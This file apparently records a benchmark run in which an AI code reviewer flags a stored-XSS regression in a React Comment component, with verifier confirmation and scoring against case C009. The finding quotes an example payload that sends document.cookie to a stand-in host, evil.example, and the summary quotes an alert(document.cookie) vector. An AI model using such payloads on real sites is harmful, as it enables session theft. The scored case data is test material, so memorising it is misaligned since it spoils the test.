@@ -1,0 +1,79 @@
+{
+  "case": "C009",
+  "pr": "C009",
+  "repo": "fixture",
+  "provider": "grok",
+  "api_base": "",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "4e469f0c6687",
+  "turns": 4,
+  "tool_calls": null,
+  "seconds": 45.0,
+  "setup_seconds": 0.0,
+  "total_seconds": 45.1,
+  "usage": {
+    "in": 16527,
+    "cache_read": 100736,
+    "cache_write": 0,
+    "out": 1691,
+    "source": "cli"
+  },
+  "cost_usd": 0.0734208,
+  "changed_files": [
+    "src/components/Comment.tsx"
+  ],
+  "findings": [
+    {
+      "path": "src/components/Comment.tsx",
+      "line": 5,
+      "severity": "critical",
+      "body": "**Issue:** `escapeHtml` was removed and `body` is assigned directly to `dangerouslySetInnerHTML.__html`. Any HTML/JS in the comment string runs in the victim\u2019s origin (stored XSS if comments are user-supplied).\n\n**Failure mode:** A body like `<img src=x onerror=\"fetch('https://evil.example?'+document.cookie)\">` or `<script>\u2026</script>`-equivalent markup executes when the comment renders. The prior `escapeHtml` path prevented this; this diff reintroduces it with no sanitizer or markdown allowlist.\n\n**Fix:** Restore escaping, or parse markdown into React nodes / sanitize with a strict allowlist (e.g. DOMPurify) before setting `__html`. Do not pass unsanitized strings to `dangerouslySetInnerHTML`.\n\n```suggestion\nexport function Comment({ body }: { body: string }) {\n  return <div className=\"comment\">{body}</div>;\n}\n```\n\n(The suggestion renders plain text safely via React\u2019s default escaping. If bold/links are required, use a markdown library that emits React elements or sanitize HTML before `__html`.)"
+    }
+  ],
+  "summary": "## Verdict\n\n**Critical XSS regression** \u2014 this change removes the only HTML escaping on comment bodies and feeds the raw string into `dangerouslySetInnerHTML`.\n\n## Analysis\n\n`Comment` previously ran `body` through `escapeHtml` before assigning it to `__html`. That made the old `dangerouslySetInnerHTML` path safe (escaped text only). This PR deletes `escapeHtml` and passes `body` straight through.\n\nAny caller that renders user- or third-party-supplied comment text will execute attacker HTML/JS in the page session. Example payload: `<img src=x onerror=alert(document.cookie)>`, or a crafted `<a>`/`<script>`-style vector. The comment claims \u201crich formatting (bold/links),\u201d but there is no markdown parser and no sanitizer (e.g. DOMPurify, a allowlist renderer) \u2014 only raw HTML injection.\n\n## Recommendation\n\nDo not merge until comment HTML is either (a) rendered via a vetted markdown\u2192React path with no raw HTML, or (b) sanitized with a strict allowlist before `dangerouslySetInnerHTML`. Restoring `escapeHtml` is the correct interim fix if rich formatting is not ready.\n\n**Recommendation:** request-changes",
+  "verification": [
+    {
+      "path": "src/components/Comment.tsx",
+      "line": 5,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "The diff removes `escapeHtml` and assigns `body` directly to `dangerouslySetInnerHTML.__html`, so any HTML/JS in the comment string executes in-page. That is a real stored-XSS regression with no sanitizer; critical severity is appropriate."
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 1,
+    "seconds": 10.12,
+    "verified": 1,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 0,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 2581,
+      "out": 378
+    },
+    "cost_usd": 0.008377
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C009-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
